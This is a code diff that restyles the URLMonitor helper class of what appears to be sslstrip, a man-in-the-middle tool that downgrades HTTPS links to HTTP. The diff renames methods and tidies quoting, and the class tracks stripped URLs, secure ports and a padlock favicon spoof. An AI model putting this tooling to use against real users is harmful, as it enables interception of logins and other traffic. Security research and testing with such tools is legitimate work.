@@ -16,6 +16,7 @@
 #
 
 import re
+from typing import ClassVar
 
 
 class URLMonitor:
@@ -25,9 +26,7 @@ class URLMonitor:
     """
 
     # Start the arms race, and end up here...
-    javascriptTrickery = [
-        re.compile(r"http://.+\.etrade\.com/javascript/omntr/tc_targeting\.html")
-    ]
+    javascriptTrickery: ClassVar[list] = [re.compile(r'http://.+\.etrade\.com/javascript/omntr/tc_targeting\.html')]
     _instance = None
 
     def __init__(self):
@@ -35,29 +34,29 @@ class URLMonitor:
         self.strippedURLPorts = {}
         self.faviconReplacement = False
 
-    def isSecureLink(self, client, url):
+    def is_secure_link(self, client, url):
         for expression in URLMonitor.javascriptTrickery:
             if re.match(expression, url):
                 return True
 
         return (client, url) in self.strippedURLs
 
-    def getSecurePort(self, client, url):
+    def get_secure_port(self, client, url):
         if (client, url) in self.strippedURLs:
             return self.strippedURLPorts[(client, url)]
         else:
             return 443
 
-    def addSecureLink(self, client, url):
-        methodIndex = url.find("//") + 2
+    def add_secure_link(self, client, url):
+        methodIndex = url.find('//') + 2
         method = url[0:methodIndex]
 
-        pathIndex = url.find("/", methodIndex)
+        pathIndex = url.find('/', methodIndex)
         host = url[methodIndex:pathIndex]
         path = url[pathIndex:]
 
         port = 443
-        portIndex = host.find(":")
+        portIndex = host.find(':')
 
         if portIndex != -1:
             host = host[0:portIndex]
@@ -70,19 +69,17 @@ class URLMonitor:
         self.strippedURLs.add((client, url))
         self.strippedURLPorts[(client, url)] = int(port)
 
-    def setFaviconSpoofing(self, faviconSpoofing):
-        self.faviconSpoofing = faviconSpoofing
+    def set_favicon_spoofing(self, favicon_spoofing):
+        self.faviconSpoofing = favicon_spoofing
 
-    def isFaviconSpoofing(self):
+    def is_favicon_spoofing(self):
         return self.faviconSpoofing
 
-    def isSecureFavicon(self, client, url):
-        return (self.faviconSpoofing == True) and (
-            url.find("favicon-x-favicon-x.ico") != -1
-        )
+    def is_secure_favicon(self, client, url):
+        return (self.faviconSpoofing is True) and (url.find('favicon-x-favicon-x.ico') != -1)
 
     @staticmethod
-    def getInstance():
+    def get_instance():
         if URLMonitor._instance is None:
             URLMonitor._instance = URLMonitor()
 
